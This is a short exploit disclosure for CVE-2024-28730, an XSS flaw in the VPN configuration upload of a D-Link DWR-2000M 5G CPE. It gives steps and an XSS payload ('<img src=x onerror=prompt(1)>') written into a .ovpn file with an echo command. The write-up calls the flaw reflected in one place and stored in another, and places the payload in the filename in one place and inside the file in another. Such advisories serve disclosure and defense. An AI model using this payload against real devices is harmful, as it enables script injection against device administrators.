CVE-2024-28730,  Reflected Cross Site Scripting XSS  vulnerability in DLink DWR 2000M 5G CPE With


Exploit Title : CVE-2024-28730

Vulnerbaility: Cross Site Scripting XSS

Date 10-11-2024

Author: Vinod Kumar Shrimali (mrnmap)

Vendor Homepage : https://dlinkmea.com/index.php/product/details?det=K1o4UkpXMHIreWZYMzhnV0JwbWFadz09

Researcher: Vinod Kumar Shrimali (mrnmap)| Shilpa Verma(SV)


Model:   DLink DWR 2000M 5G CPE With Wifi 6 Ax1800
Version: DWR-2000M_1.34ME


Description: 
A critical security vulnerability has been identified in the file upload feature of the VPN configuration module, where insufficient MIME type and file name validation expose the application to Stored Cross-Site Scripting (XSS) attacks. Exploiting this vulnerability, an attacker could upload a malicious OpenVPN configuration file (.ovpn) containing an XSS payload embedded within the file name. For instance, by naming the file "<img src=x onerror=prompt(1)>.ovpn", the attacker triggers the execution of arbitrary JavaScript code when the file name is rendered on the application's interface or logs, leading to a XSS attack.



Step 1: Create a maliocious paylaod file with follwoing payload inside file  <img src=x onerror=prompt(1)>

Step 2 Save this as file.ovpn

Step 2: Login to 5G CPE and navigate to More ==> Network ==> OpenVPn and click on edit


Step 3: import Select .ovpn file which we create 

Step 4: you will XSS Popup

Payload 
echo "<img src=x onerror=prompt(1)>" >> file.ovpn
